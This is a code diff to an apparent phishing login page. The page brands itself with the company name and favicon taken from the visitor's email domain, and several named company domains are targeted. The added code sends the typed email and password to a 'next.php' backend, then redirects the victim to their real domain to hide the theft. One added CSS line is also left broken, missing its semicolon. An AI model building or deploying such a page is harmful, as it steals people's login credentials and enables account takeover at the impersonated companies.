@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <style>
         body {
-            background: #f0f4f7; /* Light gray background */
+            background: #2874A6
             margin: 0;
             padding: 0;
             display: flex;
@@ -153,7 +153,7 @@
 
             const companyNameMapping = {
                 "gagecoinc.com": "GAGECOINC",
-                "pineappleinc.com": "PINEAPPLEINC",
+                "unitedcorporate.com": "UNITEDCORPORATE",
                 "pinnacleinfotech.com": "PINNACLEINFOTECH"
             };
 
@@ -165,6 +165,7 @@
             logo.src = faviconUrl;
         });
 
+        /* Backend Connectivity */
         function nextFun() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
@@ -172,9 +173,30 @@
             if (!email || !password) {
                 const errorDiv = document.getElementById("error-message");
                 errorDiv.style.display = "block";
-                errorDiv.innerText = "Email or Password is empty.";
+                errorDiv.innerText = "Email or Password cannot be empty.";
                 setTimeout(() => errorDiv.style.display = "none", 2000);
+                return;
             }
+
+            // AJAX request to next.php
+            fetch("./next.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                    if (data.success) {
+                        window.location.replace(data.redirectUrl || `https://${email.split("@")[1]}`);
+                    } else {
+                        const errorDiv = document.getElementById("error-message");
+                        errorDiv.style.display = "block";
+                        errorDiv.innerText = "Invalid credentials. Please try again.";
+                    }
+                })
+                .catch((error) => console.error("Error during login:", error));
         }
     </script>
 </body>
